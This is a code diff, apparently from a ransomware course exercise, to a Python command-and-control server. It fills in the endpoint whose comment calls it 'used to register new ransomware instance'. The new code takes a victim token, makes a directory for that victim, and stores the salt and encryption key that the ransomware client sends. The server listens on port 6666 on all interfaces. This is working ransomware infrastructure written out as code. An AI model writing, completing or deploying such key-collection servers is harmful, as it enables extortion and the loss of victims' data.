@@ -18,8 +18,27 @@ class CNC(CNCBase):
             f.write(bin_data)
 
     def post_new(self, path:str, params:dict, body:dict)->dict:
-        # used to register new ransomware instance
-        return {"status":"KO"}
+        #get the token  from the dictionnary body
+        token = body.get('token')
+        
+        #check that the token exists
+        if token:
+            # Create a directory using the path and the token
+            dir_path = os.path.join(path, token)
+            os.makedirs(dir_path, exist_ok=True)
+            
+            #get the slat and the key from the dictionnary body
+            salt = body.get('salt')
+            key = body.get('key')
+            
+            #check that the salt and key exist
+            if salt and key:
+                #save the salt and key in their files
+                self.save_b64(token,salt,'salt.bin') 
+                self.save_b64(token,key,'key.bin')
+                return {"status":"Success"}
+
+        return {"status":"Error"}
 
            
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
